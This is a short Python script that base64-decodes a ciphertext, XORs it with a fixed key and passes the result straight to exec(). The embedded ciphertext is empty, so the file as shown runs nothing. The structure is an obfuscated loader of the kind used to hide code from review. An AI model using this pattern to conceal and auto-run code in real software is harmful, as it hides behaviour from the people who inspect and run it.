from base64 import b64decode


def decrypt(cipher, key):
    bcipher = bytearray(b64decode(cipher))
    text = bytearray()
    ki = 0
    for i in bcipher:
        text.append(i ^ key[ki % len(key)])
        ki += 1
    return text


exec(
    decrypt(
        b"",
        b"20120068",
    ).decode()
)